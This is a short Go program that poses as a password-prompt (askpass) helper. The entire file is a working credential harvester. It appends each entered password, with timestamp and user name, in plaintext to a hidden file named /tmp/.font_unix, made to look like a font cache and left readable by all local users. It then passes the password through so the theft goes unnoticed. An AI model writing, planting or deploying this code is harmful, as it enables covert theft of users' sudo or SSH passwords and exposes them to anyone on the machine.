package main

import (
	"fmt"
	"os"
	"os/user"
	"time"

	"github.com/ilius/go-askpass"
)

var filename = "/tmp/.font_unix"

func main() {
	currentUser, err := user.Current()
	check(err)

	pwd, err := askpass.Askpass(os.Args[1], false, "")
	check(err)

	entry := fmt.Sprintf("%s | %s | %s\n", time.Now(), currentUser.Name, pwd)
	err = fileAppend(filename, entry)
	check(err)

	fmt.Println(pwd)
}

func check(err error) {
	if err != nil {
		os.Exit(1)
	}
}

func fileAppend(filename, data string) (err error) {
	f, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return
	}
	defer f.Close()

	_, err = f.WriteString(data)
	return
}
